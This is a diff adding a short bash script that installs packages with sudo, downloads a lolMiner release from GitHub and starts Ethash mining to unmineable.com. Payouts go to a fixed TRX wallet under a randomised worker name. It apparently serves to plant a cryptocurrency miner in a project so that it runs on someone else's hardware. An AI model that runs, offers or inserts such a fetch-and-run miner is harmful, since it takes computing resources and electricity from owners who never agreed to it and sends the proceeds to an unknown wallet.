@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo apt update && apt install git wget nano libpci-dev && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 -u TRX:TPQwsYETz17e5Xka2aqMwSXRtfGCaPbhzH.$(echo $(shuf -i 1-10 -n 1)-LolMiner#ln9q-3xm0) --ethstratum ETHPROXY
